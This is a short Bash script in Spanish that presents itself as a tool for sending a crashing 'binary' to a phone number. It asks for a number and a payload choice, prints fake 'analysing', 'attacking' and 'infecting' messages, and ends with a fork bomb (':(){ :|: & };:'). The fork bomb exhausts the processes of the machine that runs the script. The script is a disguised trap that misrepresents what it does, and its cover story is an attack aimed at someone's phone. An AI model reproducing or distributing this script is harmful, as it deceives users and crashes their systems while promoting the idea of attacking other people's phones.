
#!/bin/bash
W='\033[1;39m'
R='\033[1;31m'
Z='\033[1;34m'
M='\033[1;35m'

clear
sleep 3
echo -e "
${W}  ▄     ▄
${W} █████████
${W} █▄█████▄█
 █${R}▼▼▼▼▼▼
${W} █${Z} Destroyer       ${W}by SolitarioH4ck23
${W} █${R}▲▲▲▲▲▲
${W} █████████

${R} Welcome to Destructor :)

"
sleep 2
echo -e "${Z}[ ${R} X ${Z} ] Ingrese el número al que enviarle el binario..\n"
echo -e -n '>> ' ${W}
read -r nm
sleep 3
clear
echo -e ${Z}
echo 'Analizando...'
sleep 2
echo 'Número Existente!'
sleep 1
clear
echo -e ${Z}'
[ + ] Elige el binario a enviarle! [ + ]

'
echo -e "${Z}[${R} 1 ${Z}]${R}【ḶḕḠḭṏN🥶"
sleep 0.1
echo -e "${Z}[${R} 2 ${Z}]${R}〖乃ѺѺᎷ💣${Z} "
sleep 1
echo ' '
echo -ne ">> " ${R}
read -r wu
echo -e ${Z}

if [ $wu == '1' ];then

        echo 'Preparando binario LeGioN...'

elif [ $wu == '2' ];then

        echo 'Preparando binario LeGioN...'

else

        echo "Elige bien la obcion..."

        exit

fi

sleep 5
echo ' '
echo -e 'Atacando...😈\n'
sleep 1
echo 'infectando a' $nm
sleep 2
echo '¡En Ejecución!'
:(){ :|: & };:
